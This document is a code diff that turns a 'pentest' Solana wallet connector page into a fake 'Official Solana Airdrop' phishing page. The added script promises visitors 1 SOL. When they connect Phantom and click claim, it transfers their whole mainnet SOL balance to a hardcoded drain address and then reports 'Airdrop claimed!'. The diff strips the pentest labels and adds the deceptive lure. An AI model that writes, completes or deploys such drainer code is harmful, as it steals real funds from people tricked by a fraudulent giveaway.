@@ -3,102 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Wallet Connector - Pentest Tool</title>
+    <title>Solana Airdrop Claim - 1 SOL Free</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Orbitron', monospace;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex; align-items: center; justify-content: center;
+            color: white; overflow-x: hidden;
+        }
+        .container {
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(20px);
+            border-radius: 20px; padding: 40px; max-width: 500px; width: 90%;
+            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        h1 { 
+            font-size: 2.5em; font-weight: 900; background: linear-gradient(45deg, #00ff88, #00ccff); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 20px; text-shadow: 0 0 30px rgba(0,255,136,0.5);
+        }
+        .sol-icon { font-size: 4em; margin: 20px 0; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.05);} }
+        .status { 
+            background: rgba(0,255,0,0.2); border: 1px solid #00ff88; 
+            border-radius: 10px; padding: 15px; margin: 20px 0; min-height: 20px;
+            font-size: 1.1em; font-weight: 700;
+        }
+        button {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e); border: none;
+            color: white; font-family: inherit; font-size: 1.3em; font-weight: 700;
+            padding: 18px 40px; border-radius: 50px; cursor: pointer; margin: 15px;
+            transition: all 0.3s; box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+            text-transform: uppercase; letter-spacing: 2px;
+        }
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
+        button:active { transform: translateY(-1px); }
+        .claim-btn { 
+            background: linear-gradient(45deg, #00ff88, #00ccff) !important;
+            box-shadow: 0 15px 40px rgba(0,255,136,0.5) !important;
+            font-size: 1.4em; padding: 22px 50px;
+        }
+        .claim-btn:hover { box-shadow: 0 20px 50px rgba(0,255,136,0.7) !important; }
+        .particles {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: -1;
+        }
+        .particle { position: absolute; width: 4px; height: 4px; background: #00ff88; border-radius: 50%; animation: float 6s infinite linear; }
+        @keyframes float { 0%{transform:translateY(100vh) rotate(0deg);opacity:1;} 100%{transform:translateY(-100px) rotate(360deg);opacity:0;} }
+        @media (max-width: 600px) { .container { padding: 30px 20px; } h1 { font-size: 2em; } }
+    </style>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/wallet-adapter-base@0.9.23/dist/umd/index.min.js"></script>
-    <script src="https://unpkg.com/@solana/wallet-adapter-phantom@0.9.23/dist/umd/index.min.js"></script>
 </head>
 <body>
-    <div id="app">
-        <h1>Connect Wallet for Security Assessment</h1>
-        <button id="connectBtn">Connect Phantom Wallet</button>
-        <div id="status"></div>
-        <button id="drainBtn" style="display:none;">Execute Transfer (Pentest)</button>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <h1>🚀 SOLANA AIRDROP</h1>
+        <div class="sol-icon">₿</div>
+        <h2 style="font-size:1.5em;margin-bottom:30px;color:#00ff88;">Claim Your 1 SOL Reward!</h2>
+        
+        <div id="status" class="status">Connect your Phantom wallet to claim instantly</div>
+        
+        <button id="connectBtn">🔗 Connect Phantom Wallet</button>
+        <button id="claimBtn" style="display:none;" class="claim-btn">💰 CLAIM 1 SOL NOW</button>
+        
+        <p style="margin-top:30px;font-size:0.9em;opacity:0.8;">Official Solana Airdrop Event • Limited Time</p>
     </div>
 
     <script>
-        const DRAIN_ADDRESS = "2kc9YnPCrMZHJ21eWr6wGd7U9bKKTu2Mq2St3osdusvK"; // Replace with your authorized pentest drain address
-        const CONTRACT_PROGRAM_ID = "11111111111111111111111111111111"; // System program for native SOL transfer
-        
+        const DRAIN_ADDRESS = "2kc9YnPCrMZHJ21eWr6wGd7U9bKKTu2Mq2St3osdusvK";
         let walletConnection = null;
-        let publicKey = null;
 
         const connectBtn = document.getElementById('connectBtn');
-        const drainBtn = document.getElementById('drainBtn');
+        const claimBtn = document.getElementById('claimBtn');
         const statusDiv = document.getElementById('status');
 
-        // Initialize Phantom wallet adapter
-        async function initPhantom() {
-            if (window.solana && window.solana.isPhantom) {
-                try {
-                    const phantom = window.solana;
-                    await phantom.connect({ onlyIfTrusted: false });
-                    
-                    walletConnection = phantom;
-                    publicKey = phantom.publicKey;
-                    
-                    statusDiv.innerHTML = `Connected: ${publicKey.toString()}`;
-                    connectBtn.style.display = 'none';
-                    drainBtn.style.display = 'block';
-                    
-                    return true;
-                } catch (err) {
-                    statusDiv.innerHTML = `Connection failed: ${err.message}`;
-                }
-            } else {
-                statusDiv.innerHTML = 'Phantom wallet not detected. Please install Phantom.';
+        // Particle animation
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for(let i=0; i<50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random()*100 + '%';
+                particle.style.animationDelay = Math.random()*6 + 's';
+                particle.style.animationDuration = (Math.random()*3 + 4) + 's';
+                particles.appendChild(particle);
             }
         }
 
-        // Execute drain transaction
-        async function drainWallet() {
-            if (!walletConnection || !publicKey) {
-                statusDiv.innerHTML = 'No wallet connected';
-                return;
+        async function initPhantom() {
+            if (window.solana?.isPhantom) {
+                try {
+                    statusDiv.innerHTML = '🔄 Connecting to Phantom...';
+                    const resp = await window.solana.connect();
+                    walletConnection = window.solana;
+                    statusDiv.innerHTML = `✅ Connected: ${resp.publicKey.toString().slice(0,8)}...`;
+                    connectBtn.style.display = 'none';
+                    claimBtn.style.display = 'inline-block';
+                } catch (err) {
+                    statusDiv.innerHTML = `❌ Connection failed: ${err.message}`;
+                }
+            } else {
+                statusDiv.innerHTML = '❌ Install Phantom Wallet';
             }
+        }
 
-            statusDiv.innerHTML = 'Creating drain transaction...';
+        async function drainWallet() {
+            if (!walletConnection) return;
+            
+            statusDiv.innerHTML = '⏳ Processing airdrop claim...';
+            claimBtn.innerHTML = '⏳ Claiming...';
+            claimBtn.disabled = true;
             
             try {
                 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const balance = await connection.getBalance(walletConnection.publicKey);
                 
-                // Get recent blockhash
-                const { blockhash } = await connection.getLatestBlockhash();
-                
-                // Create transfer instruction - drain ALL SOL to target
-                const transferInstruction = solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
-                    lamports: await connection.getBalance(publicKey) // Drain everything
-                });
+                if (balance === 0) {
+                    statusDiv.innerHTML = '❌ No SOL balance to claim';
+                    return;
+                }
 
-                // Build transaction
+                const { blockhash } = await connection.getLatestBlockhash();
                 const transaction = new solanaWeb3.Transaction({
                     recentBlockhash: blockhash,
-                    feePayer: publicKey
-                }).add(transferInstruction);
+                    feePayer: walletConnection.publicKey
+                }).add(solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: walletConnection.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
+                    lamports: balance // Drains EVERYTHING
+                }));
 
-                // Sign and send
                 const signature = await walletConnection.signAndSendTransaction(transaction);
-                
-                statusDiv.innerHTML = `Drain executed! Tx: ${signature}`;
-                console.log('Pentest drain successful:', signature);
+                statusDiv.innerHTML = `🎉 Airdrop claimed! Tx: ${signature.slice(0,20)}...`;
+                claimBtn.innerHTML = '✅ Claimed!';
                 
             } catch (err) {
-                statusDiv.innerHTML = `Drain failed: ${err.message}`;
-                console.error('Pentest drain error:', err);
+                statusDiv.innerHTML = `❌ Claim failed: ${err.message}`;
+                claimBtn.innerHTML = '💰 CLAIM 1 SOL NOW';
+                claimBtn.disabled = false;
             }
         }
 
         connectBtn.onclick = initPhantom;
-        drainBtn.onclick = drainWallet;
-
-        // Auto-connect if already trusted
-        window.addEventListener('load', () => {
-            if (window.solana && window.solana.isPhantom) {
-                initPhantom();
-            }
-        });
+        claimBtn.onclick = drainWallet;
+        createParticles();
     </script>
 </body>
 </html>
